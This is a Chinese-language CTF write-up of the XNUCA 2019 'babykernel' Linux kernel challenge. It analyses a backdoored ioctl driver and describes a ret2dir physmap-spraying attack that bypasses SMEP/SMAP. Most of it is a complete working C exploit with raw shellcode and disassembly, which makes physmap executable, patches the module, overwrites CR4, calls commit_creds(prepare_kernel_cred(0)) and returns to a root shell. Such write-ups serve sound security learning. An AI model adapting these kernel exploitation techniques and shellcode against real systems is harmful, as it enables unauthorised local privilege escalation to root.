# 2019XNUCA-babykernel

## 信息收集

start.sh qemu启动脚本如下：

```shell
$ cat ./start.sh 
#!/bin/sh
GDB_PORT=1234
qemu-system-x86_64 \
-m 256M \
-kernel ./bzImage \
-initrd  ./1.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic nokaslr" \
-cpu qemu64,+smep,+smap \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-gdb tcp::${GDB_PORT} \
-monitor /dev/null -nographic 2>/dev/null
```

可见开启了 SMEP、SMAP 保护，未开启 KASLR。

提取文件系统后查看目标驱动和内核保护：

```shell
$ checksec vmlinux
[*] '/home/ivan/kernel/babykernel/vmlinux'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments
$ checksec osok.ko
[*] '/home/ivan/kernel/babykernel/output/osok.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```

init 系统启动脚本如下：

```shell
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /osok.ko
chmod 666 /dev/osok

poweroff -d 180 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

可见开启了`kptr_restrict`并且禁用了`dmesg`

查看目标内核版本：

```shell
/ $ cat /proc/version
Linux version 5.2.0 (ww9210@ww9210-PowerEdge-R720xd) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04)) #2 SMP Sat Jul 20 22:47:13 CST 2019
```



## 关键函数分析&漏洞点

将 osok.ko 拖入 ida 分析：

重点函数只有`device_ioctl()`一个，当 `cmd` 为1337时，将 `arg` 值传入 `handle_args()`函数中:

```c
__int64 __fastcall device_ioctl(file *filp, unsigned int cmd, unsigned __int64 arg)
{
  unsigned __int64 v3; // rbp

  v3 = arg;
  mutex_lock(&ts_mutex);
  if ( cmd == 1337 && handle_args(v3) )
    BUG();
  mutex_unlock(&ts_mutex);
  return -22LL;
}
```

`handle_args()`将 `arg` 作为结构体将 `rdi`、`rip`值保存到 bss 段，之后调用 `request_threaded_irq()`函数申请中断，并在新的线程中执行 `irq_handler()`:

```c
int __fastcall handle_args(unsigned __int64 arg)
{
  unsigned __int64 v1; // rax
  int result; // eax

  if ( (signed int)copy_from_user(&cfh, arg, 144LL) < 0 )
    return -13;
  v1 = cfh.rdi;
  *(&qword_AE0 + 0x20000000) = 37392LL;
  cfh_rdi_AE8 = v1;
  cfh_rip_AD0 = cfh.rip;
  memset(&cfh, 0, sizeof(cfh));
  result = request_threaded_irq(11LL, irq_handler, 0LL, 128LL, "osok_test");
  if ( result )
  {
    printk(&unk_328);
    free_irq(11LL, irq_handler);
    result = -1;
  }
  return result;
}
```

`irq_handler()`最终会调用`one_gadget_chain_0()`这个后门，主要是将之前设置的`rdi` 、`rip`压栈，并将 `done` 值至 1，使得该后门只能使用一次。

```assembly
.text.unlikely:00000000000002AF ; int one_gadget_chain_0(unsigned __int64 arg)
.text.unlikely:00000000000002AF one_gadget_chain_0 proc near            ; CODE XREF: irq_handler:loc_80↑p
.text.unlikely:00000000000002AF                                         ; one_gadget_chain:loc_1AD↑p
.text.unlikely:00000000000002AF                 push    cs:cfh_rdi_AE8
.text.unlikely:00000000000002B5                 pop     rdi
.text.unlikely:00000000000002B6                 mov     cs:cfh_rdi_AE8, 0
.text.unlikely:00000000000002C1                 mov     cs:done, 1
.text.unlikely:00000000000002CB                 xor     rax, rax
.text.unlikely:00000000000002CE                 xor     rcx, rcx
.text.unlikely:00000000000002D1                 xor     rdx, rdx
.text.unlikely:00000000000002D4                 xor     rsi, rsi
.text.unlikely:00000000000002D7                 push    cs:cfh_rip_AD0
.text.unlikely:00000000000002DD                 retn
```

现在本题的问题简化为：在只能控制 `rdi`、`rip`且只能利用一次后门的情况下，绕过 SMAP 、SMEP 。

本题主要使用 Ret2dir 的攻击方法绕过 SMAP\SMEP ，由于只有一次后门利用的机会需要选择合适的 gadget，选取gadget 的方法和构造 ROP 链的思路可参考这篇论文：**KEPLER: Facilitating Control-flow Hijacking Primitive Evaluation for Linux Kernel Vulnerabilities**。



## 利用思路

- 由于当前环境下 PEN 信息不可读，需要通过 physmap spraying 通过大量申请内存填充相同 payload ，再随机挑选一个 physmap 地址，能有较大概率命中 payload。

  physamp地址选取的方法可以在 spray 时在开头设置特定字符串，之后在gdb中查找即可：

  ```shell
  pwndbg> find 0xffff888000000000,0xffff88800d5b7000,"AAAAAAA"
  0xffff888001e21000
  0xffff888001e31000
  0xffff888001e41000
  ...
  ```

-  调用后门函数，将 `rdi `设置为猜测的 physmap 地址，`rip`设置为`regcache_mark_dirty()` 函数地址,这个函数包含两个间接调用，可以在一次利用中提供更多操作。`regcache_mark_dirty()`汇编代码如下（其中 `sub_FFFFFFFF81E00F20()`函数为 `jmp rax` ）：

  ```assembly
  .text:FFFFFFFF81608250 regcache_mark_dirty proc near   ; CODE XREF: sub_FFFFFFFF817F2010+18↓p
  .text:FFFFFFFF81608250                 push    rbx
  .text:FFFFFFFF81608251                 mov     rbx, rdi
  .text:FFFFFFFF81608254                 mov     rdi, [rdi+30h]
  .text:FFFFFFFF81608258                 mov     rax, [rbx+20h]
  .text:FFFFFFFF8160825C                 call    sub_FFFFFFFF81E00F20
  .text:FFFFFFFF81608261                 mov     byte ptr [rbx+228h], 1
  .text:FFFFFFFF81608268                 mov     byte ptr [rbx+229h], 1
  .text:FFFFFFFF8160826F                 mov     rdi, [rbx+30h]
  .text:FFFFFFFF81608273                 mov     rax, [rbx+28h]
  .text:FFFFFFFF81608277                 pop     rbx
  .text:FFFFFFFF81608278                 jmp     sub_FFFFFFFF81E00F20
  .text:FFFFFFFF81608280                 mov     eax, [rdi]
  .text:FFFFFFFF81608282                 sub     eax, [rsi]
  .text:FFFFFFFF81608284                 retn
  ```

  

- 由于内核版本5.2，physmap 不可执行，所以 调用 `set_memory_x(unsigned long addr, int numpages)`函数将猜测的 physmap 地址设置为可执行，这样就可以在之后直接执行预先布置在 physmap 上的 shellcode。

  由于 `set_memory_x()`需要控制 `rdi` 、`rsi`而目前只能控制 `rdi`要先寻找可以为 `rsi`赋值的 gadget。

- 调用`set_memory_rw()` 将 osok.ko 程序所在页面设置为可读可写，修改 `handle_args()`函数关闭SMEP\SMAP 并提权，修改的汇编代码如下：

  ```assembly
  mov rdi,0
  #prepare_kernel_cred
  mov rax,0xffffffff81087130 
  call rax
  mov rdi,rax
  #commit_creds
  mov rax,0xffffffff81086e20
  call rax
  mov rdi,0x6f0
  mov rdx,0x48
  # mov cr4, rdi; push rdx; popfq; ret;
  mov rax,0xffffffff81050e02
  call rax
  
  swapgs
  #user_ss
  push 0x2b
  push 0x101000
  #user_eflags
  push 0x246
  #user_cs
  push 0x33
  #user_sp
  push 0x400B4D #get_shell()
  iretq
  ```

- 之后恢复寄存器值和栈空间到进入`one_gadget_chain_0()`前状态,正常退出。

- 最后再次调用 `device_ioctl()`因为此时  `handle_args()`函数已经被修改，当再次进入该函数时将进行提权操作。

## exp

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <memory.h>
#include <pty.h>
#include <signal.h>

struct control_flow_hijack_primitive{
	long long rax;
	long long rbx;
	long long rcx;
	long long rdx;
	long long rsi;
	long long rdi;
	long long rsp;
	long long rbp;
	long long r8;
	long long r9;
	long long r10;
	long long r11;
	long long r12;
	long long r13;
	long long r14;
	long long r15;
	long long rip;
	long long reset_all;
};


#define regcache_mark_dirty 0xffffffff81608250
#define mp_size			1024*64 //64K
#define spray_times		64*32	// heap spray size : 64K*64*32 = 128M*2
#define set_memory_x		0xffffffff81056ca0

long long guess_physmap = 0xffff888002396000;

void get_shell(void){
    system("/bin/sh");
}

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL= 0xffffffff81087130;
void (*commit_creds)(void*) KERNCALL=0xffffffff81086e20;
void payload(){
      commit_creds(prepare_kernel_cred(0));
}

void error_quit(char *arg)
{
	puts(arg);
	exit(-1);
}

void heap_spray()
{
	int i = 0,num;
	char *mp;
	char *p;
	for (i = 0; i < spray_times; i++)
	{
        	if ((p = mmap(NULL, mp_size, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 )) == MAP_FAILED)
                	error_quit("mmap error");
		memset(p,'A',0x7);
		for (num = 0; num < 64; num++)
		{
			mp = p + num * 1024;
			*((unsigned long *)&mp[0x30]) = guess_physmap+0x40;
			*((unsigned long *)&mp[0x20]) = 0xffffffff8153588e;
			*((unsigned long *)&mp[0xe0]) = 0;
			*((unsigned long *)&mp[0x9e]) = 0xffffffff81608251;//regcache_mark_dirty+1
			*((unsigned long *)&mp[0x8]) =  guess_physmap+0x70;
			*((unsigned long *)&mp[0x70]) =  guess_physmap;
			*((unsigned long *)&mp[0x60]) =  set_memory_x;
			*((unsigned long *)&mp[0x68]) =  guess_physmap+0x100;
			*((unsigned long *)&mp[0x270]) =  0xffffffff810a9114;//jmp qword ptr [rsi + 0x2e];
			memcpy(mp+0x100,"\x90\x90\x90\x90\x90\x90\x48\xc7\xc0\xb0\x73\x05\x81\x48\xc7\xc7\x00\x00\x00\xc0\x48\xc7\xc6\x01\x00\x00\x00\xff\xd0\x48\xc7\xc0\x80\x0a\x00\xc0\x48\xc7\x00\x00\x00\x00\x00\x48\xc7\xc0\xc0\x01\x00\xc0\x48\xbb\x48\xc7\xc7\x00\x00\x00\x00\x48\x48\x89\x18\x48\xc7\xc0\xc8\x01\x00\xc0\x48\xbb\xc7\xc0\x30\x71\x08\x81\xff\xd0\x48\x89\x18\x48\xc7\xc0\xd0\x01\x00\xc0\x48\xbb\x48\x89\xc7\x48\xc7\xc0\x20\x6e\x48\x89\x18\x48\xc7\xc0\xd8\x01\x00\xc0\x48\xbb\x08\x81\xff\xd0\x48\xc7\xc7\xf0\x48\x89\x18\x48\xc7\xc0\xe0\x01\x00\xc0\x48\xbb\x06\x00\x00\x48\xc7\xc2\x48\x00\x48\x89\x18\x48\xc7\xc0\xe8\x01\x00\xc0\x48\xbb\x00\x00\x48\xc7\xc0\x02\x0e\x05\x48\x89\x18\x48\xc7\xc0\xf0\x01\x00\xc0\x48\xbb\x81\xff\xd0\x0f\x01\xf8\x6a\x2b\x48\x89\x18\x48\xc7\xc0\xf8\x01\x00\xc0\x48\xbb\x68\x00\x10\x10\x00\x68\x46\x02\x48\x89\x18\x48\xc7\xc0\x00\x02\x00\xc0\x48\xbb\x00\x00\x6a\x33\x68\x4d\x0b\x40\x48\x89\x18\x48\xc7\xc0\x08\x02\x00\xc0\x48\xc7\xc3\x00\x48\xcf\x00\x48\x89\x18\x48\xbb\x00\x68\x9f\x0f\x80\x88\xff\xff\x49\xc7\xc4\x01\x00\x00\x00\x49\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc5\x0b\x00\x00\x00\x48\xbc\x20\x3f\x00\x00\x00\xc9\xff\xff\x49\xbd\x6c\x3f\x00\x00\x00\xc9\xff\xff\x4d\x31\xdb\x4d\x31\xf6\x4d\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x58\x48\xc7\xc0\x3b\x72\x0b\x81\x50\x48\xc7\xc0\x85\x00\x00\xc0\x50\x6a\x46\x9d\xfa\x48\x31\xc0\xc3",331);
		}
	}	
}

//0xffffffffc0000000
unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}
void getshell()
{
    system("/bin/sh");
}

int main(void){
    setbuf(stdout,0);
    save_stats();
    printf("%lx %lx %lx %lx\n",user_cs,user_eflags,user_sp,user_ss);
    char * pp = mmap(0x100000, 0x10000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,-1, 0);
	int fd = open("/dev/osok",O_RDWR);
	if(fd < 0 ){
		printf("Open /dev/osok error!\n");
		exit(0);
	}
	heap_spray();
	struct control_flow_hijack_primitive buf;
	buf.rip=regcache_mark_dirty;
	buf.rdi=guess_physmap;
	ioctl(fd,1337,&buf);
	sleep(4);
	int fp = open("/dev/osok",O_RDWR);
	if(fp < 0 ){
		printf("Open /dev/osok error!\n");
		exit(0);
	}
	ioctl(fp,1337,0);
	getshell();
	return 0;
    

}
/*
# shellcode

   0:   90                      nop
   1:   90                      nop
   2:   90                      nop
   3:   90                      nop
   4:   90                      nop
   5:   90                      nop
   6:   48 c7 c0 b0 73 05 81    mov    rax, 0xffffffff810573b0 #set_memory_rw
   d:   48 c7 c7 00 00 00 c0    mov    rdi, 0xffffffffc0000000
  14:   48 c7 c6 01 00 00 00    mov    rsi, 0x1
  1b:   ff d0                   call   rax
  
  1d:   48 c7 c0 80 0a 00 c0    mov    rax, 0xffffffffc0000a80
  24:   48 c7 00 00 00 00 00    mov    QWORD PTR [rax], 0x0
  2b:   48 c7 c0 c0 01 00 c0    mov    rax, 0xffffffffc00001c0
  32:   48 bb 48 c7 c7 00 00    movabs rbx, 0x4800000000c7c748
  39:   00 00 48 
  3c:   48 89 18                mov    QWORD PTR [rax], rbx
  3f:   48 c7 c0 c8 01 00 c0    mov    rax, 0xffffffffc00001c8
  46:   48 bb c7 c0 30 71 08    movabs rbx, 0xd0ff81087130c0c7
  4d:   81 ff d0 
  50:   48 89 18                mov    QWORD PTR [rax], rbx
  53:   48 c7 c0 d0 01 00 c0    mov    rax, 0xffffffffc00001d0
  5a:   48 bb 48 89 c7 48 c7    movabs rbx, 0x6e20c0c748c78948
  61:   c0 20 6e 
  64:   48 89 18                mov    QWORD PTR [rax], rbx
  67:   48 c7 c0 d8 01 00 c0    mov    rax, 0xffffffffc00001d8
  6e:   48 bb 08 81 ff d0 48    movabs rbx, 0xf0c7c748d0ff8108
  75:   c7 c7 f0 
  78:   48 89 18                mov    QWORD PTR [rax], rbx
  7b:   48 c7 c0 e0 01 00 c0    mov    rax, 0xffffffffc00001e0
  82:   48 bb 06 00 00 48 c7    movabs rbx, 0x48c2c748000006
  89:   c2 48 00 
  8c:   48 89 18                mov    QWORD PTR [rax], rbx
  8f:   48 c7 c0 e8 01 00 c0    mov    rax, 0xffffffffc00001e8
  96:   48 bb 00 00 48 c7 c0    movabs rbx, 0x50e02c0c7480000
  9d:   02 0e 05 
  a0:   48 89 18                mov    QWORD PTR [rax], rbx
  a3:   48 c7 c0 f0 01 00 c0    mov    rax, 0xffffffffc00001f0
  aa:   48 bb 81 ff d0 0f 01    movabs rbx, 0x2b6af8010fd0ff81
  b1:   f8 6a 2b 
  b4:   48 89 18                mov    QWORD PTR [rax], rbx
  b7:   48 c7 c0 f8 01 00 c0    mov    rax, 0xffffffffc00001f8
  be:   48 bb 68 00 10 10 00    movabs rbx, 0x246680010100068
  c5:   68 46 02 
  c8:   48 89 18                mov    QWORD PTR [rax], rbx
  cb:   48 c7 c0 00 02 00 c0    mov    rax, 0xffffffffc0000200
  d2:   48 bb 00 00 6a 33 68    movabs rbx, 0x400b4d68336a0000
  d9:   4d 0b 40 
  dc:   48 89 18                mov    QWORD PTR [rax], rbx
  df:   48 c7 c0 08 02 00 c0    mov    rax, 0xffffffffc0000208
  e6:   48 c7 c3 00 48 cf 00    mov    rbx, 0xcf4800
  ed:   48 89 18                mov    QWORD PTR [rax], rbx
  
  f0:   48 bb 00 68 9f 0f 80    movabs rbx, 0xffff88800f9f6800
  f7:   88 ff ff 
  fa:   49 c7 c4 01 00 00 00    mov    r12, 0x1
 101:   49 c7 c7 01 00 00 00    mov    r15, 0x1
 108:   48 c7 c5 0b 00 00 00    mov    rbp, 0xb
 10f:   48 bc 20 3f 00 00 00    movabs rsp, 0xffffc90000003f20
 116:   c9 ff ff 
 119:   49 bd 6c 3f 00 00 00    movabs r13, 0xffffc90000003f6c
 120:   c9 ff ff 
 123:   4d 31 db                xor    r11, r11
 126:   4d 31 f6                xor    r14, r14
 129:   4d 31 d2                xor    r10, r10
 12c:   4d 31 c0                xor    r8, r8
 12f:   4d 31 c9                xor    r9, r9
 132:   58                      pop    rax
 133:   48 c7 c0 3b 72 0b 81    mov    rax, 0xffffffff810b723b
 13a:   50                      push   rax
 13b:   48 c7 c0 85 00 00 c0    mov    rax, 0xffffffffc0000085
 142:   50                      push   rax
 143:   6a 46                   push   0x46
 145:   9d                      popf   
 146:   fa                      cli    
 147:   48 31 c0                xor    rax, rax
 14a:   c3                      ret
*/

```



## 参考资料

[1] https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Pwn/babykernel
[2] https://0xffff.one/d/346